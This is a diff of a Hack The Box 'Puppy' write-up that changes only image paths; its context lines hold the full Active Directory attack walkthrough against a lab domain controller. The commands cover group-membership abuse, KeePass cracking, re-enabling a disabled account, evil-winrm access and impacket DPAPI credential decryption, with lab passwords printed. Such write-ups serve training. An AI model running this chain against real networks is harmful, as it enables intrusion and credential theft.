@@ -17,7 +17,7 @@ tags:
   - dpapi
   - credentials
 author: pir4cy
-coverImage: /images/htb/covers/puppy-cover.png
+coverImage: /images/writeups/covers/puppy-cover.png
 draft: false
 ---
 
@@ -48,7 +48,7 @@ We have the credentials for an account: levi.james / KingofAkron2025!
 ## Initial Scan
 
 As always, we start with an nmap scan - 
-![Nmap Scan](/images/htb/machines/Puppy/nmap.png "NMAP")
+![Nmap Scan](/images/writeups/machines/Puppy/nmap.png "NMAP")
 
 Looks like a pretty standard Domain Controller. Let's add this DC at the end of our hosts file.
 ```
@@ -63,14 +63,14 @@ A quick check using the wmi mode shows that our credentials are valid -
 nxc wmi dc.puppy.htb -u levi.james -p 'KingofAkron2025!'
 ```
 
-![levi james credentials](/images/htb/machines/Puppy/levi-valid.png)
+![levi james credentials](/images/writeups/machines/Puppy/levi-valid.png)
 
 We can also enumerate any potential file shares for access using - 
 ```
 nxc smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
 ```
 
-![levi-smb-shares](/images/htb/machines/Puppy/levi-smb-shares.png)
+![levi-smb-shares](/images/writeups/machines/Puppy/levi-smb-shares.png)
 
 Not seeing a lot of access here, let's try bloodhound and see what information we can gather.
 
@@ -79,20 +79,20 @@ We can either use `bloodhound-python` or `nxc ldap` for bloodhound data collecti
 1. For bloodhound-python - `bloodhound-python -d PUPPY.HTB -u levi.james -p "KingofAkron2025!" -gc dc.puppy.htb -c all -ns 10.10.11.70`
 2. For nxc  - `nxc ldap dc.puppy.htb -u puppy.htb\\levi.james -p 'KingofAkron2025!' --bloodhound --collection All -d PUPPY.HTB --dns-server 10.10.11.70`
 
-![nxc-bloodhound](/images/htb/machines/Puppy/nxc-bloodhound.png)
+![nxc-bloodhound](/images/writeups/machines/Puppy/nxc-bloodhound.png)
 
 Either of the methods should provide some collection data that we can then load into Bloodhound.
 
-![bloodhound-ingest](/images/htb/machines/Puppy/bloodhound-upload-files.png)
+![bloodhound-ingest](/images/writeups/machines/Puppy/bloodhound-upload-files.png)
 ## Foothold
 
 After Bloodhound ingests all the data that's uploaded, let's take a look and see what we can access with our existing privilege.
 
-![bloodhound-levi](/images/htb/machines/Puppy/bloodhound-levi.png)
+![bloodhound-levi](/images/writeups/machines/Puppy/bloodhound-levi.png)
 
 We have `GenericWrite` control access on the group Developers. Bloodhound is also nice enough to give us a method to abuse this access.
 
-![bloodhound-write-access](/images/htb/machines/Puppy/bloodhound-write-access.png)
+![bloodhound-write-access](/images/writeups/machines/Puppy/bloodhound-write-access.png)
 
 We can abuse this access to add our user (levi.james) to the Developers group.
 ```
@@ -100,7 +100,7 @@ net rpc group addmem "Developers" "levi.james" -U "puppy.htb"/"levi.james"%'King
 ```
 
 Now we should have access to the DEV share we discovered during our enumeration.
-![levi-dev-share](/images/htb/machines/Puppy/levi-dev-share.png)
+![levi-dev-share](/images/writeups/machines/Puppy/levi-dev-share.png)
 
 We can continue to use nxc to get this data by using - 
 ```
@@ -111,30 +111,30 @@ The DEV share has an interesting file called `recovery.kdbx`. KDBX is used for K
 
 We may be able to extract some credentials from this database file.
 
-![KeePass Locked - Big F](/images/htb/machines/Puppy/kdbx-locked-sadge.png)
+![KeePass Locked - Big F](/images/writeups/machines/Puppy/kdbx-locked-sadge.png)
 
 I tried using `keepass2john` to bruteforce the password but sadly, John does not support the 4.x format :(
-![no john support](/images/htb/machines/Puppy/keepass2john-fail.png)
+![no john support](/images/writeups/machines/Puppy/keepass2john-fail.png)
 
 I ended up finding a github script to crack the 4.x hash - https://github.com/r3nt0n/keepass4brute 
 ```
 ./keepass4brute.sh ~/puppy-htb/recovery.kdbx /usr/share/wordlists/rockyou.txt
 ```
 Let's see what we get  - 
-![keepass4brute-success](/images/htb/machines/Puppy/keepass4brute-success.png)
+![keepass4brute-success](/images/writeups/machines/Puppy/keepass4brute-success.png)
 
 Gotta love the weak password for password manager. Using the acquired password, we are able to view the database - 
-![keepass-expose](/images/htb/machines/Puppy/keepass-expose.png)
+![keepass-expose](/images/writeups/machines/Puppy/keepass-expose.png)
 
 
 #### Current Loot
 - Usernames - we can grab the entire list of users from bloodhound directly
-![bloodhound-users](/images/htb/machines/Puppy/bloodhound-all-users.png)
+![bloodhound-users](/images/writeups/machines/Puppy/bloodhound-all-users.png)
 - Passwords - including our credentials and the ones we grabbed from the database
-![loot-captured-1](/images/htb/machines/Puppy/loot-foothold.png)
+![loot-captured-1](/images/writeups/machines/Puppy/loot-foothold.png)
 
 Before we move on, let's test these credentials to see if we get any sort of access.
-![ant.edward credential](/images/htb/machines/Puppy/ant-edwards-valid-cred.png)
+![ant.edward credential](/images/writeups/machines/Puppy/ant-edwards-valid-cred.png)
 
 Looks like we only have 1 valid credential - `ant.edwards:Antman2025!`
 
@@ -147,7 +147,7 @@ nxc ldap dc.puppy.htb -u puppy.htb\\ant.edwards -p 'Antman2025!' --bloodhound --
 We can then re-upload the extracted data, which should be relatively quicker than the first time around.
 
 Now let's see what permissions we get using `ant.edwards` account.
-![bloodhound ant edwards](/images/htb/machines/Puppy/bloodhound-ant.png)
+![bloodhound ant edwards](/images/writeups/machines/Puppy/bloodhound-ant.png)
 
 Similar to our initial Foothold, we see that `ant` has *GenericAll* permissions for `Adam.Silver` account - full control of the user allows us to modify properties of the user as needed.
 
@@ -161,16 +161,16 @@ Another roadblock that comes up is that Adam's account is currently disabled. We
 bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
 ```
 
-![bloodyAD](/images/htb/machines/Puppy/bloodyAD-account-enable.png)
+![bloodyAD](/images/writeups/machines/Puppy/bloodyAD-account-enable.png)
 
 Now we should have access to `adam.silver`'s account. 
-![adam silver owned](/images/htb/machines/Puppy/adam-silver-owned.png)
+![adam silver owned](/images/writeups/machines/Puppy/adam-silver-owned.png)
 
 Let's update this on bloodhound and see what we can get from Adam's account.
-![adam remote access](/images/htb/machines/Puppy/adam-silver-access.png)
+![adam remote access](/images/writeups/machines/Puppy/adam-silver-access.png)
 
 Testing credentials with `nxc winrm` mode.
-![nxc winrm](/images/htb/machines/Puppy/adam-silver-nxc-winrm.png)
+![nxc winrm](/images/writeups/machines/Puppy/adam-silver-nxc-winrm.png)
 
 Now we can launch `evil-winrm` and get our flag - 
 ```
@@ -178,23 +178,23 @@ evil-winrm -i dc.puppy.htb -u 'adam.silver' -p 'pir4cy1sc00l!'
 ```
 
 
-![user pwn](/images/htb/machines/Puppy/user-pwned.png)
+![user pwn](/images/writeups/machines/Puppy/user-pwned.png)
 
 
 ## Privilege Escalation
 With our newfound privileges, we can snoop around and enumerate the file system as much as possible. 
 
 Browsing through, we see a *Backups* folder that contains a zip file. We can download this file using Evil-WinRM's `download` option and open it up on our local machine.
-![backup files found](/images/htb/machines/Puppy/backup-exposed.png)
+![backup files found](/images/writeups/machines/Puppy/backup-exposed.png)
 
 After extracting the files from the backup, there is an interesting file `nms-auth-config.xml.bak`. 
 This file provides us with additional credentials as well -
-![steph-cooper-pwn](/images/htb/machines/Puppy/steph-cooper-password.png)
+![steph-cooper-pwn](/images/writeups/machines/Puppy/steph-cooper-password.png)
 
 - New credentials: `steph.cooper:ChefSteph2025!`
 
 Testing it out with nxc again - 
-![steph cooper owned](/images/htb/machines/Puppy/steph-cooper-owned.png)
+![steph cooper owned](/images/writeups/machines/Puppy/steph-cooper-owned.png)
 
 Based on what we have seen so far, `Steph Cooper` has 2 accounts - 
 - Mortal Account - `steph.cooper:ChefSteph2025!`
@@ -238,7 +238,7 @@ These **protected files** for common users are in:
 In our case, the file reside in `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\`
 
 Similar to the last section, we can utilize the base64 method to export this credential file.
-![dpapi cred files](/images/htb/machines/Puppy/dpapi-creds-transfer.png)
+![dpapi cred files](/images/writeups/machines/Puppy/dpapi-creds-transfer.png)
 
 
 ## Root
@@ -255,7 +255,7 @@ impacket-dpapi masterkey -file master.key -t puppy.htb/steph.cooper:'ChefSteph20
 ```
 
 This will generate the decrypted key, which we can then use for the next step.
-![dpapi decrypted](/images/htb/machines/Puppy/dpapi-decrypted-key.png)
+![dpapi decrypted](/images/writeups/machines/Puppy/dpapi-decrypted-key.png)
 
 ### Decrypting the Credential
 With the cracked key, we can now proceed to decrypt the credential we extracted from the target.
@@ -265,12 +265,12 @@ impacket-dpapi credential -file credential -key '0xd9a570722fbaf7149f9f9d691b0e1
 ```
 
 At last, we receive credentials for `steph.cooper_adm`
-![steph cooper adm](/images/htb/machines/Puppy/dpapi-creds-cracked.png)
+![steph cooper adm](/images/writeups/machines/Puppy/dpapi-creds-cracked.png)
 
 We can now use these to grab the root flag from `C:\Users\Administrator\Desktop`
 
 ### Rooted
-![Pwned](/images/htb/machines/Puppy/puppy-pwnd.png)
+![Pwned](/images/writeups/machines/Puppy/puppy-pwnd.png)
 
 ## Conclusion
 At last, we got the root flag. I loved this box due to it's realism. It was a great experience and we ended up using a bunch of different tools and methodologies that I had not explored. 
